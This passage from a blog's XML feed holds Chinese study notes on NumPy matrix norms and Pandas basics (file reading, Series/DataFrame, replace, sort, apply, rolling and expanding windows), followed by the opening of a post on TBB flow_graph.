class="vlist-r"><span class="vlist" style="height:1.6513970000000007em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0040200000000001em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443142857142858em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span></span></p>
</li>
</ul>
<p>在矩阵范数的计算中，最重要的是<code>ord</code>参数</p>
<table>
<thead>
<tr>
<th style="text-align:left">ord</th>
<th style="text-align:right">norm for matrices</th>
<th style="text-align:right">norm for vectors</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">None</td>
<td style="text-align:right">Frobenius norm</td>
<td style="text-align:right">2-norm</td>
</tr>
<tr>
<td style="text-align:left">‘fro’</td>
<td style="text-align:right">Frobenius norm</td>
<td style="text-align:right">/</td>
</tr>
<tr>
<td style="text-align:left">‘nuc’</td>
<td style="text-align:right">nuclear norm</td>
<td style="text-align:right">/</td>
</tr>
<tr>
<td style="text-align:left">inf</td>
<td style="text-align:right">max(sum(abs(x), axis=1))</td>
<td style="text-align:right">max(abs(x))</td>
</tr>
<tr>
<td style="text-align:left">-inf</td>
<td style="text-align:right">min(sum(abs(x), axis=1))</td>
<td style="text-align:right">min(abs(x))</td>
</tr>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:right">/</td>
<td style="text-align:right">sum(x != 0)</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:right">max(sum(abs(x), axis=0))</td>
<td style="text-align:right">as below</td>
</tr>
<tr>
<td style="text-align:left">-1</td>
<td style="text-align:right">min(sum(abs(x), axis=0))</td>
<td style="text-align:right">as below</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:right">2-norm (largest sing. value)</td>
<td style="text-align:right">as below</td>
</tr>
<tr>
<td style="text-align:left">-2</td>
<td style="text-align:right">smallest singular value</td>
<td style="text-align:right">as below</td>
</tr>
<tr>
<td style="text-align:left">other</td>
<td style="text-align:right">/</td>
<td style="text-align:right">sum(abs(x)**ord)**(1./ord)</td>
</tr>
</tbody>
</table>
<p>-矩阵乘法<code>@</code></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi mathvariant="bold">A</mi><mo>∗</mo><mrow><mi mathvariant="normal">m</mi><mo>×</mo><mi mathvariant="normal">p</mi></mrow><mi mathvariant="bold">B</mi><mo>∗</mo><mrow><mi mathvariant="normal">p</mi><mo>×</mo><mi mathvariant="normal">n</mi></mrow><mo stretchy="false">]</mo><mo>∗</mo><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">j</mi></mrow><mo>=</mo><mo>∑</mo><mo>∗</mo><msup><mrow><mi mathvariant="normal">k</mi><mo>=</mo><mn>1</mn></mrow><mi mathvariant="normal">p</mi></msup><mi mathvariant="bold">A</mi><mo>∗</mo><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">k</mi></mrow><mi mathvariant="bold">B</mi><mo>∗</mo><mrow><mi mathvariant="normal">k</mi><mi mathvariant="normal">j</mi></mrow></mrow><annotation encoding="application/x-tex">\rm [\mathbf{A}*{m\times p}\mathbf{B}*{p\times n}]*{ij} = \sum*{k=1}^p\mathbf{A}*{ik}\mathbf{B}*{kj}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mopen">[</span><span class="mord"><span class="mord mathbf">A</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathrm">p</span></span><span class="mord"><span class="mord mathbf">B</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathrm">n</span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">i</span><span class="mord mathrm">j</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∗</span><span class="mord"><span class="mord"><span class="mord mathrm">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathrm">1</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.748732em;"><span style="top:-3.1473400000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathrm mtight">p</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathbf">A</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">i</span><span class="mord mathrm">k</span></span><span class="mord"><span class="mord mathbf">B</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">k</span><span class="mord mathrm">j</span></span></span></span></span></span></span></p>
<p><code>A@B</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Joyful-Pandas</category>
      </categories>
      <tags>
        <tag>Pandas</tag>
        <tag>numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas笔记-2-Pandas基础</title>
    <url>/2022/10/16/18-28-23/</url>
    <content><![CDATA[<p>文件的读写、基本数据结构、常用基本函数、窗口对象</p>
<span id="more"></span>
<h2 id="文件的读写"><a class="markdownIt-Anchor" href="#文件的读写"></a> 文件的读写</h2>
<h3 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h3>
<p><code>pandas</code>可以读取很多文件格式，此处只讲<code>csv</code>,<code>excel</code>,<code>txt</code>。</p>
<ul>
<li><code>df_csv=pd.read_csv(.csv)</code></li>
<li><code>df_txt=pd.read_table(.txt)</code></li>
<li><code>df_excel=pd.read_excel(.xlsx)</code><br>
有一些常用的公共参数</li>
<li><code>header=None</code>表示第一行不作为列名</li>
<li><code>index_col=['col1','col2']</code>表示将某一列或几列作为索引</li>
<li><code>usecols=['col1','col2']</code>要读取的列的集合，默认全部</li>
<li><code>parse_dates=['col']</code>需要转化为时间的列</li>
<li><code>nrows=3</code>要读取的行数<br>
读取<code>txt</code>文件遇到分隔符非空格，添加分割参数<code>sep</code>，并指定引擎为<code>python</code>，如</li>
</ul>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">pd.read_table('filepath.txt',sep='re',engine='python')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>需要注意，<code>sep</code>是正则参数</strong></p>
<h3 id="数据写入"><a class="markdownIt-Anchor" href="#数据写入"></a> 数据写入</h3>
<p><code>df_csv.to_csv('filepath.csv',index=False)</code>常把<code>index</code>设置为<code>False</code>，特别是在索引无特殊意义时，保存时能够去除索引。<br>
<code>df_txt.to_csv('filepath.txt',sep='\t',index=False)</code>没有<code>to_table</code>，常用<code>\t</code>分割<br>
<code>df_csv.to_markdown()</code>和<code>df_csv.to_latex()</code>能将表格转换为<code>markdown</code>和<code>latex</code>语言</p>
<h2 id="基本数据结构"><a class="markdownIt-Anchor" href="#基本数据结构"></a> 基本数据结构</h2>
<p>一维的<code>Series</code>和二维的<code>DataFrame</code></p>
<h3 id="series"><a class="markdownIt-Anchor" href="#series"></a> Series</h3>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'dic1'</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">#序列的值</span>
              index <span class="token operator">=</span> pd<span class="token punctuation">.</span>Index<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'id1'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'third'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'my_idx'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">#索引，也可以指定名字，默认为空</span>
              dtype <span class="token operator">=</span> <span class="token string">'object'</span><span class="token punctuation">,</span><span class="token comment">#存储类型</span>
              name <span class="token operator">=</span> <span class="token string">'my_name'</span><span class="token comment">#序列名字)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>object</code>代表一种混合类型，<code>pandas</code>将纯字符串序列也默认视为<code>object</code>类型序列，但也可以用<code>string</code>类型存储<br>
可以通过<code>.</code>的方式获取属性，如<code>s.values</code>,<code>s.index</code>等，使用<code>.shape</code>获取序列的长度</p>
<h3 id="dataframe"><a class="markdownIt-Anchor" href="#dataframe"></a> DataFrame</h3>
<p><code>DataFrame</code>在<code>Series</code>上增加了列索引，可以通过二维的<code>data</code>与行列索引来构造</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token number">3.2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span>
                  index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'row_%d'</span><span class="token operator">%</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                  columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'col_0'</span><span class="token punctuation">,</span> <span class="token string">'col_1'</span><span class="token punctuation">,</span> <span class="token string">'col_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>更多的，会采用从列索引名到数据的映射来构造数据框，并加上行索引</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'col_0'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                          <span class="token string">'col_1'</span><span class="token punctuation">:</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                          <span class="token string">'col_2'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">3.2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
                  index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'row_%d'</span><span class="token operator">%</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在<code>DataFrame</code>中可以用<code>df.['col_1']</code>与<code>df.[[</code>col_1<code>,</code>col_2<code>]]</code>来取出相应的列与多个列组成的表，返回类型分别为<code>Series</code>和<code>DataFrame</code><br>
与<code>Series</code>类似，<code>DataFrame</code>也可以取出相应的属性<br>
通过<code>.T</code>将<code>DataFrame</code>转置</p>
<h2 id="常用基本函数"><a class="markdownIt-Anchor" href="#常用基本函数"></a> 常用基本函数</h2>
<h3 id="汇总函数"><a class="markdownIt-Anchor" href="#汇总函数"></a> 汇总函数</h3>
<p><code>head(n)</code>，<code>tail(n)</code>返回前<code>n</code>或后<code>n</code>行，<code>n</code>默认为5<br>
<code>info()</code>,<code>describe()</code>返回表的信息概况和表中数值列对应的主要统计量</p>
<h3 id="特征统计函数"><a class="markdownIt-Anchor" href="#特征统计函数"></a> 特征统计函数</h3>
<p><code>sum</code>求和，<code>mean</code>平均值，<code>median</code>中位数，<code>var</code>方差，<code>std</code>标准差，<code>max</code>，<code>min</code><br>
<code>quantile(n)</code>分位数，<code>count</code>非缺失值个数，<code>idxmax</code>最大值对应索引<br>
以上函数有公共参数<code>axis</code>，默认0逐列聚合，1逐行聚合</p>
<h3 id="唯一值函数"><a class="markdownIt-Anchor" href="#唯一值函数"></a> 唯一值函数</h3>
<p>对序列使用<code>unique</code>,<code>nunique</code>得到唯一值组成的列表和唯一值个数<br>
<code>value_counts</code>得到唯一值和其对应的频数<br>
<code>drop_duplicates(['col_name1','col_name2',···],keep=first)</code>多个列组合的唯一值，<code>keep</code>默认<code>first</code>表示保留第一次出现的行，<code>last</code>最后，<code>false</code>重复的删除（这让我想起了sql的distinct）<code>drop_duplicated</code>返回是否为唯一值的布尔列表</p>
<h3 id="替换函数"><a class="markdownIt-Anchor" href="#替换函数"></a> 替换函数</h3>
<p><code>pandas</code>中的替换函数包含映射替换、逻辑替换、数值替换</p>
<ul>
<li>
<p>映射替换（<code>replace</code>,<code>str.replace</code>,<code>cat.codes</code>）</p>
</li>
<li>
<p><code>replace</code><br>
可以通过字典构造，或者传入两个列表来替换</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'col_name1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'key_1'</span><span class="token punctuation">:</span> value_1<span class="token punctuation">,</span><span class="token string">'key_2'</span><span class="token punctuation">:</span>value_2<span class="token punctuation">}</span><span class="token punctuation">)</span>
df<span class="token punctuation">[</span><span class="token string">'col_name1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'key_1'</span><span class="token punctuation">,</span><span class="token string">'key_2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>value_1<span class="token punctuation">,</span>value_2<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以指定<code>method</code>参数为<code>ffill</code>或<code>bfill</code>，分别使用前一个或后一个未被替换的值替换<br>
<strong>如果没有这样的值，那么就取头或尾的值</strong>，如</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'bfill'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>逻辑替换（<code>where</code>,<code>mask</code>）<br>
<code>where</code>对不符合传入条件的行进行替换，<code>mask</code>反之，不指定替换之则替换为缺失值NaN<br>
<code>s.where(s_condition,value)</code><br>
也可以传入与s索引一致的布尔序列</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s_condition <span class="token operator">=</span>pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span>···<span class="token punctuation">]</span><span class="token punctuation">,</span>index<span class="token operator">=</span>s<span class="token punctuation">.</span>index<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>where<span class="token punctuation">(</span>s_condition<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>数值替换（<code>round</code>,<code>abs</code>,<code>clip</code>）</p>
<ul>
<li><code>round</code>按给定精度四舍五入</li>
<li><code>abs</code>取绝对值</li>
<li><code>clip</code>截断</li>
</ul>
</li>
</ul>
<h3 id="排序函数"><a class="markdownIt-Anchor" href="#排序函数"></a> 排序函数</h3>
<ul>
<li>值排序（<code>sort_values</code>）<br>
<code>df.sort_values('col_1',ascending=True)</code>，<code>ascending</code>默认<code>True</code>升序。<br>
可以对多列排序<br>
<code>df.sort_values(['col_1','col_2',···],descending=[True,False])</code>，传入两个列表即可</li>
<li>索引排序（<code>sort_index</code>）<br>
用法与值排序一致，但元素的值在索引中，要指定索引层的名字或层号，用<code>level</code>表示。字符串按字母顺序排序<br>
<code>df.sort_index(level=['col_1','col2'],ascending=[True,False])</code></li>
</ul>
<h3 id="apply方法"><a class="markdownIt-Anchor" href="#apply方法"></a> <code>apply</code>方法</h3>
<p><code>apply</code>方法常用于<code>DataFrame</code>的行迭代或者列迭代，其参数往往是一个以序列为输入的函数，如<code>.mean()</code>，可以这样写出</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_mean</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#x为输入的序列</span>
    res<span class="token operator">=</span>x<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res
df<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>my_mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>也可以使用<code>lambda</code>表达式<code>df.apply(lambda x:x.mean())</code><br>
<strong><code>apply</code>使用性能换取自由度，仅在有自定义需求时再去考虑使用</strong></p>
<h2 id="窗口对象"><a class="markdownIt-Anchor" href="#窗口对象"></a> 窗口对象</h2>
<h3 id="滑窗对象"><a class="markdownIt-Anchor" href="#滑窗对象"></a> 滑窗对象</h3>
<p>要使用滑窗函数，必须先对一个序列使用<code>.rolling</code>得到滑窗对象，最重要的参数是滑窗大小<code>window</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">roller<span class="token operator">=</span>s<span class="token punctuation">.</span>rolling<span class="token punctuation">(</span>window<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>类滑窗函数，公共参数<code>periods=n</code>，默认为1，可以为负，表示反向操作<br>
它们的功能可以用窗口大小为<code>n+1</code>的<code>rolling</code>方法等价替代</p>
<ul>
<li>
<p><code>shift</code>取向前第<code>n</code>个元素的值</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>rolling<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># s.shift(2)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>diff</code>与向前第<code>n</code>个元素做差（区别于numpy）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>rolling<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># s.shift(2)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>pct_change</code>与向前第<code>n</code>个元素相比计算增长率。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_pct</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
   L <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
   <span class="token keyword">return</span> L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">/</span>L<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span>
s<span class="token punctuation">.</span>rolling<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>my_pct<span class="token punctuation">)</span> <span class="token comment"># s.pct_change()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h3 id="扩张窗口"><a class="markdownIt-Anchor" href="#扩张窗口"></a> 扩张窗口</h3>
<p>又称累计窗口，可以理解为一个动态长度的窗口，其窗口的大小就是从序列开始处到具体操作的对应位置，其使用的聚合函数会作用于这些逐步扩张的窗口上。具体地说，设序列为a1, a2, a3, a4，则其每个位置对应的窗口即[a1]、[a1, a2]、[a1, a2, a3]、[a1, a2, a3, a4]。<br>
与类滑窗函数类似，也有类扩张窗口函数</p>
<ul>
<li>
<p><code>cummax</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>expanding<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#s.cummax()</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>cumsum</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>expanding<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#s.cumsum()</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>cumprod</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>expanding<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>values<span class="token punctuation">.</span>prod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#s.cumprod()</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>Joyful-Pandas</category>
      </categories>
      <tags>
        <tag>Pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>Tbb_flow_graph学习笔记</title>
    <url>/2023/12/16/11-17-45/</url>
    <content><![CDATA[<p>TBB (Threading Building Blocks) 的 flow_graph 是一种高级的并行编程模型，它允许开发者通过定义一系列相互连接的节点来创建复杂的数据处理流程。这种模型特别适合于需要多个步骤和可能并行执行的复杂数据处理任务。</p>
<span id="more"></span>
<h2 id="设计理念"><a class="markdownIt-Anchor" href="#设计理念"></a> 设计理念</h2>
<p>flow_graph 是 Intel Threading Building Blocks (TBB) 库中的一个高级组件，它提供了一种基于图的编程模型，用于表示和管理数据和任务之间的依赖关系。flow_graph 的设计逻辑围绕以下几个核心概念：</p>
<ol>
<li>图 (Graph)<br>
基础结构：flow_graph 是一个由节点 (nodes) 和边 (edges) 构成的有向图。这个图表示数据的流动以及数据在不同计算节点之间的依赖关系。<br>
任务调度：图负责管理和调度节点上的任务执行。它确保了数据依赖和执行顺序的正确性，同时优化并行执行。</li>
<li>节点 (Nodes)<br>
类型多样：flow_graph 提供了多种类型的节点，每种节点都有其特定的功能和用途。例如，function_node 用于执行通用的计算任务，join_node 用于同步多个输入流，source_node 用于生成数据等。<br>
并行处理：节点可以并行处理数据。每个节点都封装了一些处理逻辑，当数据到达时，该逻辑被触发执行。</li>
<li>边 (Edges)<br>
数据流动：边代表数据流动的路径。它们连接不同的节点，定义了数据如何从一个节点流向另一个节点。<br>
控制流程：通过配置节点之间的边，可以精确地控制数据流动和任务执行的顺序。</li>
<li>数据流 (Data Flow)<br>
异步和非阻塞：flow_graph 的设计支持异步和非阻塞数据处理。节点在接收到数据后会立即处理，而不必等待其他操作。<br>
流动控制：可以通过边的配置和节点的容量限制来控制数据流动的速率和并发级别。</li>
<li>并行和同步<br>
并行执行：flow_graph 允许多个节点同时并行执行，最大化利用多核处理器的能力。<br>
同步机制：提供了机制来同步不同节点的处理结果，确保数据完整性和一致性。</li>
<li>动态行为<br>
